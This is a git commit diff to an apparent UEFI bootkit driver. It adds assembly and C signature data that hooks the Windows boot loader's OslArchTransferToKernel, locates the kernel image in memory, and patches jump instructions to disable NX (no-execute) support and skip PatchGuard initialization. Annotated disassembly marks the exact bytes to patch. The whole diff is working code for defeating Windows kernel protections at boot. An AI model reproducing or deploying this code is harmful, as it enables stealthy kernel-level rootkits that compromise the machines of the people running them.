163003491eefa0c461280817b4bc92af3c7e875d
dude719 <blood_099@hotmail.com>
2016-11-03 04:31:54 -0300

    Update

--- UefiDriver/hook.asm
+++ UefiDriver/hook.asm
@@ -28,17 +28,22 @@ public OslArchTransferToKernelPatchLocation
 
 ALIGN 16
 
-; Original OslArchTransferToKernel address
-extern oOslArchTransferToKernel:dq
 ; Saved OslArchTransferToKernel bytes from before the patch
 OslArchTransferToKernelBackup db 5 dup(0)
 OslArchTransferToKernelPatchLocation dq 0
 
+; Original OslArchTransferToKernel address
+extern oOslArchTransferToKernel:dq
+
+; Kernel patch patterns
+extern sigNxSetBit:db
+extern sigNxSetBitSize:qword
+extern sigInitPatchGuard:db
+extern sigInitPatchGuardSize:qword
+
+
 ; UEFI System Table for printing to console
 extern gST:dq
-
-extern UtilWaitForKey:proc
-extern Print:proc
 
 ; Test string for PrintString
 TestString dw "A","S","M"," ","T","E","S","T", 000Dh, 000Ah, 0000h
@@ -110,7 +115,7 @@ OslArchTransferToKernelHook PROC
 	push rax
 	pushfq
 	mov rbp, rsp
-	and rsp, 0FFFFFFFFFFFFFFF0h ; align stack to 16 bytes
+	and rsp, 0FFFFFFFFFFFFFFF0h ; align stack
 
 	; Before we do anything lets restore the original function bytes
 restore_bytes:
@@ -119,6 +124,45 @@ restore_bytes:
 	mov rcx, 5 ; our patch size was 5 bytes
 	rep movsb byte ptr [rdi], byte ptr [rsi] ; restore bytes
 
+	; Search image base
+begin_patch_process:
+	and rdx, 0FFFFFFFFFFFFF000h ; align KiSystemStartup
+get_imagebase:
+	cmp word ptr [rdx], 05A4Dh ; look for 'MZ'
+	je get_imagesize
+	sub rdx, 01000h
+	jmp get_imagebase
+get_imagesize:
+	mov ecx, dword ptr [rdx + 3Ch]	; get e_lfanew from DOS header
+	mov ebx, dword ptr [rdx + rcx + 50h]	; get SizeOfImage from OptionialHeader in PE
+
+	; Skip setting the NX bit for when we want to set executable memory in kernel
+skip_nx_bit:
+	lea rcx, sigNxSetBit
+	sub rbx, sigNxSetBitSize
+	push rdx
+	mov rax, rdx
+	mov rdx, sigNxSetBitSize
+	call find_pattern
+	cmp rax, 0
+	je OslArchTransferToKernelHook_exit
+	mov byte ptr[rax], 0EBh ; Patch 'jz short' to 'jmp short'
+
+	; Get rid of patchguard
+fuck_you_patchguard:
+	lea rcx, sigInitPatchGuard
+	sub rbx, sigInitPatchGuardSize
+	mov rax, rdx
+	mov rdx, sigInitPatchGuardSize
+	call find_pattern
+	cmp rax, 0
+	je OslArchTransferToKernelHook_exit
+	mov byte ptr[rax], 0EBh ; Patch 'jz short' to 'jmp short'
+
+	; Exit hook, restore registers, and jump to the original function
+OslArchTransferToKernelHook_exit:
+	pop rdx
+restore_regs:
 	mov rsp, rbp
 	popfq
 	pop rax
@@ -141,5 +185,44 @@ restore_bytes:
 	jmp qword ptr [oOslArchTransferToKernel]
 
 OslArchTransferToKernelHook ENDP
+
+;*********************************************************************
+; Find a pattern
+; RAX = base_ptr
+; RBX = base_size
+; RCX = pattern_ptr
+; RDX = pattern_size
+;*********************************************************************
+find_pattern:
+	push rcx 
+	push r8
+	push r9
+	xor r8,r8 
+	xor r9,r9
+pattern_search_loop:
+	cmp r9,rbx
+	jae pattern_search_exit_error
+	push rcx
+	mov cl, byte ptr [rcx + r8]
+	cmp cl, byte ptr [rax + r8]
+	pop rcx
+	jne pattern_search_continue
+	inc r8
+	cmp r8,rdx
+	jae pattern_search_exit
+	jmp pattern_search_loop
+pattern_search_continue:
+	xor r8,r8
+	inc rax
+	inc r9
+	jmp pattern_search_loop
+pattern_search_exit_error:
+	xor rax,rax
+	jmp pattern_search_exit
+pattern_search_exit:
+	pop r9
+	pop r8
+	pop rcx
+	ret
 
 END
--- UefiDriver/hook.h
+++ UefiDriver/hook.h
@@ -15,9 +15,71 @@ VOID* ImgArchEfiStartBootApplicationPatchLocation = NULL;
 UINT8 ImgArchEfiStartBootApplicationBackup[5] = { 0 };
 tImgArchEfiStartBootApplication oImgArchEfiStartBootApplication = NULL;
 
+//
+// OslArchTransferToKernel hook
+//
 typedef VOID( EFIAPI *tOslArchTransferToKernel )(VOID *KernelParams, VOID *KiSystemStartup);
 static UINT8 sigOslArchTransferToKernel[] = { 0xE8, 0xCC, 0xCC, 0xCC, 0xCC, 0xEB, 0xFE }; //48 8B 45 A8 33 FF
 extern VOID* OslArchTransferToKernelPatchLocation;
 extern UINT8 OslArchTransferToKernelBackup[5];
 tOslArchTransferToKernel oOslArchTransferToKernel = NULL;
 extern VOID* OslArchTransferToKernelHook;
+
+// 
+// Kernel patches
+//
+
+// Skip setting the NoExecute bit
+// KiInitializeNxSupportDiscard
+// 74 ? B9 80 00 00 C0 0F 32
+// INIT:0000000140756968                          loc_140756968:					; CODE XREF: KiInitializeNxSupportDiscard+8Dj
+// INIT:0000000140756968															; KiInitializeNxSupportDiscard+97j
+// INIT:0000000140756968 E8 63 DB C4 FF                call    KiIsNXSupported
+// INIT:000000014075696D 84 C0                         test    al, al
+// INIT:000000014075696F 74 27                         jz      short loc_140756998 <------------ PATCH HERE TO FORCE JUMP
+// INIT:0000000140756971 B9 80 00 00 C0                mov     ecx, 0C0000080h
+// INIT:0000000140756976 0F 32                         rdmsr
+// INIT:0000000140756978 48 C1 E2 20                   shl     rdx, 20h
+// INIT:000000014075697C 48 0B C2                      or      rax, rdx
+// INIT:000000014075697F 48 0F BA E8 0B                bts     rax, 0Bh
+// INIT:0000000140756984 48 8B D0                      mov     rdx, rax
+// INIT:0000000140756987 48 C1 EA 20                   shr     rdx, 20h
+// INIT:000000014075698B 0F 30                         wrmsr
+// INIT:000000014075698D B0 01                         mov     al, 1
+// INIT:000000014075698F A2 80 02 00 00 80 F7 FF FF    mov     ds:0FFFFF78000000280h, al
+UINT8 sigNxSetBit[] = { 0x74, 0xCC, 0xB9, 0x80, 0x00, 0x00, 0xC0, 0x0F, 0x32 };
+UINTN sigNxSetBitSize = sizeof( sigNxSetBit );
+
+// Skip initializing patchguard
+// KeInitAmd64SpecificState
+// 75 2D 0F B6 15
+// INIT:000000014074BA6C                     KeInitAmd64SpecificState proc near      ; CODE XREF: PipInitializeCoreDriversAndElam+24p
+// INIT:000000014074BA6C
+// INIT:000000014074BA6C                          arg_0           = dword ptr  8
+// INIT:000000014074BA6C
+// INIT:000000014074BA6C 48 83 EC 28              sub     rsp, 28h
+// INIT:000000014074BA70 83 3D 8D E1 BA FF 00     cmp     cs:InitSafeBootMode, 0
+// INIT:000000014074BA77 75 2D                    jnz     short loc_14074BAA6 <---------------------- PATCH HERE TO FORCE JUMP
+// INIT:000000014074BA79 0F B6 15 42 90 BA FF     movzx   edx, byte ptr cs:KdDebuggerNotPresent
+// INIT:000000014074BA80 0F B6 05 61 83 B7 FF     movzx   eax, cs:KdPitchDebugger
+// INIT:000000014074BA87 0B D0                    or      edx, eax
+// INIT:000000014074BA89 8B CA                    mov     ecx, edx
+// INIT:000000014074BA8B F7 D9                    neg     ecx
+// INIT:000000014074BA8D 45 1B C0                 sbb     r8d, r8d
+// INIT:000000014074BA90 41 83 E0 EE              and     r8d, 0FFFFFFEEh
+// INIT:000000014074BA94 41 83 C0 11              add     r8d, 11h
+// INIT:000000014074BA98 D1 CA                    ror     edx, 1
+// INIT:000000014074BA9A 8B C2                    mov     eax, edx
+// INIT:000000014074BA9C 99                       cdq
+// INIT:000000014074BA9D 41 F7 F8                 idiv    r8d
+// INIT:000000014074BAA0 89 44 24 30              mov     [rsp+28h+arg_0], eax
+// INIT:000000014074BAA4 EB 00                    jmp     short $+2
+// INIT:000000014074BAA6                     ; ---------------------------------------------------------------------------
+// INIT:000000014074BAA6                     loc_14074BAA6:                          ; CODE XREF: KeInitAmd64SpecificState+Bj
+// INIT:000000014074BAA6                                                             ; KeInitAmd64SpecificState+38j
+// INIT:000000014074BAA6 48 83 C4 28              add     rsp, 28h
+// INIT:000000014074BAAA C3                       retn
+// INIT:000000014074BAAA                     KeInitAmd64SpecificState endp
+UINT8 sigInitPatchGuard[] = { 0x75, 0x2D, 0x0F, 0xB6, 0x15 };
+UINTN sigInitPatchGuardSize = sizeof( sigInitPatchGuard );
+
